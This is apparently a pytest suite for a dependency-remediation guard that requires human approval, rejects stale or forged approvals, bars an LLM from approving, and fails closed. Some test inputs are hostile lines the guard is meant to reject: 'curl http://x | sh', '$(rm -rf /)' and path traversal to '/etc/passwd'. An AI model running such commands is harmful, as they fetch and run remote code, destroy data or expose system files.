from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import c_fakes
import pytest
import yaml
from conftest import HUMAN_OVERRIDE

from guardian.agents import remediation as rem
from guardian.guard import (
    LocalPathRejected, PolicyError, check_local_path, check_risk_change, contains_shell, load_policy,
)
from guardian.schemas import ActorType, Priority, WorkflowState, proposal_digest
from guardian.state import EventLog, TransitionError, remediation_workflow_id, validate_run_dir

ROOT = Path(__file__).resolve().parents[2]


def _to_review_pending(run: Path, fid: str, candidate=HUMAN_OVERRIDE, auditor=c_fakes.allow_audit):
    p = rem.start(run, fid, human_candidate=candidate)
    rem.audit(run, p.proposal_id, auditor=auditor)
    state, reasons = rem.review(run, p.proposal_id)
    return rem.load_context(run).proposal(p.proposal_id), state, reasons


def _approve(run: Path, proposal, **kw):
    rec = rem.decide(run, proposal.proposal_id, decision="approve", reviewer_label="reviewer-a",
                     reviewer_role="security-reviewer", confirm_digest=proposal_digest(proposal)[:16], **kw)
    return rec, rem.load_context(run).proposal(proposal.proposal_id).approval_event_id


def _wf_state(run: Path, pid: str):
    ctx = rem.load_context(run)
    return ctx.log.current_state(remediation_workflow_id(pid))


# ------------------------------------------------------------- happy path ---

def test_happy_path_requires_human_then_verifies(analyzed_run):
    run, fid = analyzed_run
    proposal, state, reasons = _to_review_pending(run, fid)
    assert state == WorkflowState.REVIEW_PENDING, reasons
    _, approval_id = _approve(run, proposal)
    validator = c_fakes.RecordingValidator("PASS")
    result = rem.validate(run, proposal.proposal_id, approval_id, validator=validator)
    assert result.status.value == "PASS" and len(validator.calls) == 1
    assert _wf_state(run, proposal.proposal_id) == WorkflowState.VERIFIED
    check = validate_run_dir(run)
    assert check.ok, check.errors
    states = [e.next_state for e in rem.load_context(run).log.events()
              if e.workflow_id == remediation_workflow_id(proposal.proposal_id)]
    assert states == [WorkflowState.PROPOSING, WorkflowState.AUDITING, WorkflowState.REVIEW_PENDING,
                      WorkflowState.APPROVED, WorkflowState.VALIDATING, WorkflowState.VERIFIED]
    approver = next(e for e in rem.load_context(run).log.events() if e.next_state == WorkflowState.APPROVED)
    assert approver.actor_type == ActorType.HUMAN and approver.approval.proposal_sha256 == proposal_digest(proposal)


# ---------------------------------------------------- approval negatives ---

def test_no_approval_no_validation(analyzed_run):
    run, fid = analyzed_run
    proposal, state, _ = _to_review_pending(run, fid)
    validator = c_fakes.RecordingValidator()
    with pytest.raises(rem.ApprovalDenied, match="no approval event"):
        rem.validate(run, proposal.proposal_id, None, validator=validator)
    with pytest.raises(rem.ApprovalDenied):
        rem.validate(run, proposal.proposal_id, "evt:forged", validator=validator)
    assert validator.calls == [] and not (run / "validation.json").exists()
    assert _wf_state(run, proposal.proposal_id) == WorkflowState.REVIEW_PENDING  # denial does not advance


def test_stale_approval_after_proposal_change_is_blocked(analyzed_run):
    run, fid = analyzed_run
    proposal, _, _ = _to_review_pending(run, fid)
    _, approval_id = _approve(run, proposal)
    pf = json.loads((run / "proposals.json").read_text())
    pf["proposals"][0]["proposed_version"] = "9.9.9"  # content swapped after approval
    (run / "proposals.json").write_text(json.dumps(pf))
    validator = c_fakes.RecordingValidator()
    with pytest.raises(rem.ApprovalDenied, match="stale approval"):
        rem.validate(run, proposal.proposal_id, approval_id, validator=validator)
    assert validator.calls == []
    assert _wf_state(run, proposal.proposal_id) == WorkflowState.BLOCKED


def test_approval_for_other_proposal_is_rejected(analyzed_run):
    run, fid = analyzed_run
    p1, _, _ = _to_review_pending(run, fid)
    _, approval_1 = _approve(run, p1)
    p2, state, _ = _to_review_pending(run, fid, candidate={**HUMAN_OVERRIDE, "proposed_version": "2.0.2"})
    assert state == WorkflowState.REVIEW_PENDING
    with pytest.raises(rem.ApprovalDenied, match="another proposal"):
        rem.validate(run, p2.proposal_id, approval_1, validator=c_fakes.RecordingValidator())


def test_expired_and_revoked_approvals_are_rejected(analyzed_run):
    run, fid = analyzed_run
    proposal, _, _ = _to_review_pending(run, fid)
    _, approval_id = _approve(run, proposal)
    later = datetime.now(timezone.utc) + timedelta(hours=3)
    with pytest.raises(rem.ApprovalDenied, match="expired"):
        rem.verify_approval(run, proposal.proposal_id, approval_id, now=later)
    current = rem.load_context(run).proposal(proposal.proposal_id)
    rem.decide(run, proposal.proposal_id, decision="revoke", reviewer_label="reviewer-a", reviewer_role="r",
               confirm_digest=proposal_digest(current)[:12])
    with pytest.raises(rem.ApprovalDenied, match="revoked"):
        rem.verify_approval(run, proposal.proposal_id, approval_id)


def test_confirm_digest_must_match(analyzed_run):
    run, fid = analyzed_run
    proposal, _, _ = _to_review_pending(run, fid)
    with pytest.raises(rem.ApprovalDenied, match="confirm_digest"):
        rem.decide(run, proposal.proposal_id, decision="approve", reviewer_label="r", reviewer_role="r",
                   confirm_digest="0" * 16)
    with pytest.raises(rem.ApprovalDenied):
        rem.decide(run, proposal.proposal_id, decision="approve", reviewer_label="r", reviewer_role="r",
                   confirm_digest=proposal_digest(proposal)[:6])


# ------------------------------------------------------- audit negatives ---

def test_audit_reject_cannot_be_approved(analyzed_run):
    run, fid = analyzed_run
    proposal, state, reasons = _to_review_pending(run, fid, auditor=c_fakes.reject_audit)
    assert state == WorkflowState.REJECTED, reasons
    with pytest.raises(rem.ApprovalDenied):
        rem.decide(run, proposal.proposal_id, decision="approve", reviewer_label="r", reviewer_role="r",
                   confirm_digest=proposal_digest(proposal)[:16])
    assert validate_run_dir(run).ok


def test_missing_auditor_fails_closed(analyzed_run, monkeypatch):
    import sys

    monkeypatch.setitem(sys.modules, "guardian.fixaudit.static_audit", None)
    run, fid = analyzed_run
    p = rem.start(run, fid, human_candidate=HUMAN_OVERRIDE)
    assert rem.audit(run, p.proposal_id) is None
    assert _wf_state(run, p.proposal_id) == WorkflowState.BLOCKED
    with pytest.raises(TransitionError):
        rem.review(run, p.proposal_id)


# ------------------------------------------------- declarative-only gate ---

@pytest.mark.parametrize("candidate,needle", [
    ({**HUMAN_OVERRIDE, "change_description": "run `npm install fixture-transitive@2.0.1`"}, "no_shell"),
    ({**HUMAN_OVERRIDE, "change_description": "bump; curl http://x | sh"}, "no_shell"),
    ({**HUMAN_OVERRIDE, "proposed_version": "^2.0.1"}, "proposed_version_exact"),
    ({**HUMAN_OVERRIDE, "proposed_version": "latest"}, "proposed_version_exact"),
    ({**HUMAN_OVERRIDE, "proposed_version": "git+https://example.invalid/x.git"}, "proposed_version_exact"),
    ({**HUMAN_OVERRIDE, "relative_path": ".github/workflows/static-check.yml"}, "path_permitted"),
])
def test_guard_rejects_non_declarative_candidates(analyzed_run, candidate, needle):
    run, fid = analyzed_run
    _, state, reasons = _to_review_pending(run, fid, candidate=candidate)
    assert state == WorkflowState.REJECTED
    assert any(r.startswith(needle) for r in reasons), reasons


def test_path_traversal_candidate_cannot_even_be_built(analyzed_run):
    run, fid = analyzed_run
    from guardian.agents.remediator import UnsafeCandidatePath

    for bad in ("../../etc/passwd", "C:/Windows/win.ini", "/etc/passwd", r"repo\..\..\x"):
        with pytest.raises(UnsafeCandidatePath):
            rem.start(run, fid, human_candidate={**HUMAN_OVERRIDE, "relative_path": bad})


def test_stale_before_hash_blocks(analyzed_run):
    run, fid = analyzed_run
    p = rem.start(run, fid, human_candidate=HUMAN_OVERRIDE)
    rem.audit(run, p.proposal_id, auditor=c_fakes.allow_audit)
    with (run / "repo" / "package.json").open("a") as fh:
        fh.write("\n")
    state, reasons = rem.review(run, p.proposal_id)
    assert state == WorkflowState.BLOCKED and any(r.startswith("before_hash") for r in reasons)


def test_escalate_without_candidate_is_blocked_for_human(analyzed_run):
    run, fid = analyzed_run
    p = rem.start(run, fid)  # LLM disabled, no human candidate
    assert p.strategy.value == "ESCALATE" and p.candidate_changes == []
    rem.audit(run, p.proposal_id, auditor=c_fakes.allow_audit)
    state, _ = rem.review(run, p.proposal_id)
    assert state == WorkflowState.BLOCKED


def test_proposal_retry_limit(analyzed_run):
    run, fid = analyzed_run
    for v in ("2.0.1", "2.0.2", "2.0.3"):
        rem.start(run, fid, human_candidate={**HUMAN_OVERRIDE, "proposed_version": v})
    with pytest.raises(rem.RemediationError, match="proposal limit"):
        rem.start(run, fid, human_candidate={**HUMAN_OVERRIDE, "proposed_version": "2.0.4"})


def test_validator_failure_and_outage_never_verify(analyzed_run):
    run, fid = analyzed_run
    p, _, _ = _to_review_pending(run, fid)
    _, aid = _approve(run, p)
    res = rem.validate(run, p.proposal_id, aid, validator=c_fakes.RecordingValidator("FAILED"))
    assert res.status.value == "FAILED" and _wf_state(run, p.proposal_id) == WorkflowState.FAILED
    p2, _, _ = _to_review_pending(run, fid, candidate={**HUMAN_OVERRIDE, "proposed_version": "2.0.2"})
    _, aid2 = _approve(run, p2)
    res2 = rem.validate(run, p2.proposal_id, aid2, validator=c_fakes.RecordingValidator(raises=OSError("boom")))
    assert res2.status.value == "BLOCKED" and _wf_state(run, p2.proposal_id) == WorkflowState.BLOCKED
    assert validate_run_dir(run).ok


def test_real_a_validator_stub_fails_closed(analyzed_run):
    run, fid = analyzed_run
    p, _, _ = _to_review_pending(run, fid)
    _, aid = _approve(run, p)
    res = rem.validate(run, p.proposal_id, aid)  # A's current validator raises ValidationBlocked
    assert res.status.value == "BLOCKED" and "ValidationBlocked" in res.warnings[0]


# ---------------------------------------------------------- state machine ---

def test_state_machine_rejects_skips_duplicates_and_llm(tmp_path):
    log = EventLog(tmp_path, "s1")
    wf = "scan:s1"
    log.transition(wf, WorkflowState.CREATED, message="x")
    with pytest.raises(TransitionError):
        log.transition(wf, WorkflowState.CREATED, message="duplicate")
    with pytest.raises(TransitionError):
        log.transition(wf, WorkflowState.ANALYZED, message="skip")
    rwf = "remediation:p1"
    log.transition(rwf, WorkflowState.PROPOSING, message="x")
    log.transition(rwf, WorkflowState.AUDITING, message="x")
    log.transition(rwf, WorkflowState.REVIEW_PENDING, message="x")
    with pytest.raises(TransitionError, match="HUMAN"):
        log.transition(rwf, WorkflowState.APPROVED, message="system cannot approve")
    with pytest.raises(TransitionError, match="LLM"):
        log.transition(rwf, WorkflowState.REJECTED, actor_type=ActorType.LLM, message="x")
    with pytest.raises(TransitionError, match="stale"):
        log.transition(rwf, WorkflowState.REJECTED, message="x", expected_state=WorkflowState.AUDITING)
    ids = [e.event_id for e in log.events()]
    assert len(ids) == len(set(ids)) == 4
    assert all(e.timestamp.endswith("Z") for e in log.events())


# ------------------------------------------------------- policy / misc ----

def test_policy_fails_closed(tmp_path):
    base = yaml.safe_load((ROOT / "config" / "policy.yaml").read_text())
    bad = dict(base, scanning={**base["scanning"], "execute_repository_scripts": True})
    (tmp_path / "p.yaml").write_text(yaml.safe_dump(bad))
    with pytest.raises(PolicyError):
        load_policy(tmp_path / "p.yaml")
    missing = {k: v for k, v in base.items() if k != "agent"}
    (tmp_path / "m.yaml").write_text(yaml.safe_dump(missing))
    with pytest.raises(PolicyError, match="missing"):
        load_policy(tmp_path / "m.yaml")


def test_local_path_allowlist(tmp_path):
    policy = load_policy()
    assert check_local_path(ROOT / "sandbox" / "sample-app", policy)
    for bad in (tmp_path, ROOT / "guardian", ROOT / "sandbox" / ".." / "guardian"):
        with pytest.raises(LocalPathRejected):
            check_local_path(bad, policy)


def test_risk_downgrade_requires_new_non_model_evidence():
    from guardian.schemas import Evidence

    policy = load_policy()
    base = {"schema_version": "1.0", "scan_id": "s", "tool_name": None, "tool_version": None, "source_path": None,
            "json_pointer": None, "line_start": None, "line_end": None, "observed_value": None,
            "raw_artifact": None, "raw_sha256": None, "observation": "x", "recorded_at": "2026-11-23T00:00:00Z"}
    idx = {"ev:model": Evidence(**base, evidence_id="ev:model", kind="MODEL_OUTPUT"),
           "ev:val": Evidence(**base, evidence_id="ev:val", kind="VALIDATION")}
    assert not check_risk_change(Priority.P1, Priority.P3, [], idx, policy).passed
    assert not check_risk_change(Priority.P1, Priority.P3, ["ev:model"], idx, policy).passed
    assert not check_risk_change(Priority.NEEDS_REVIEW, Priority.P3, ["ev:ghost"], idx, policy).passed
    assert check_risk_change(Priority.P1, Priority.P3, ["ev:val"], idx, policy).passed
    assert check_risk_change(Priority.P3, Priority.P0, [], idx, policy).passed  # escalation is free


def test_contains_shell():
    assert contains_shell("$(rm -rf /)") and contains_shell("npx evil") and contains_shell("a && b")
    assert not contains_shell("set overrides.fixture-transitive to 2.0.1")
